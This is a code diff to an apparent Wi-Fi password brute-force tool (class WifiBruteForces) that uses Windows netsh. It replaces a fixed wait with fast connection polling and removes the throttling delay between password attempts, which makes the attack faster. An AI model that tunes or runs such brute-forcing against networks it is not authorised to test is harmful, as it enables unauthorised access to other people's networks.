@@ -865,20 +865,19 @@ class WifiBruteForces:
             connect_cmd = f'netsh wlan connect name="{self.target_id}" interface="{self.interface}"'
             subprocess.run(connect_cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
 
-            # Wait for the connection to establish
-            sleep(5)  # Adjust the sleep time as needed
+            # Wait for the connection to establish (Polling optimization)
+            # Check every 0.5s, up to 4 seconds
+            for _ in range(8):
+                sleep(0.5)
+                check_cmd = f'netsh wlan show interface name="{self.interface}"'
+                result = subprocess.run(check_cmd, shell=True, capture_output=True, text=True)
 
-            # Verify connection by checking interface state
-            check_cmd = f'netsh wlan show interface name="{self.interface}"'
-            result = subprocess.run(check_cmd, shell=True, capture_output=True, text=True)
+                # If connected, return immediately
+                if f"SSID                   : {self.target_id}" in result.stdout:
+                    print(f"Connected to {self.target_id} on interface {self.interface}")
+                    return True
 
-            # Check if connected to the correct SSID
-            if f"SSID                   : {self.target_id}" in result.stdout:
-                 print(f"Connected to {self.target_id} on interface {self.interface}")
-                 return True
-            else:
-                 # print(f"Failed to connect to {self.target_id} on interface {self.interface}")
-                 return False
+            return False
         except Exception as e:
             print(f"Error connecting to Wi-Fi network: {e}")
             return False
@@ -1077,7 +1076,7 @@ class WifiBruteForces:
                         break  # Exit loop on success
 
                     progress.update(task, advance=1)
-                    sleep(1)  # Optional delay to avoid flooding the network
+                    # sleep(1)  # Removed for speed
 
                 if not success:
                     print(f"Brute force failed. Could not connect to {self.target_id}")
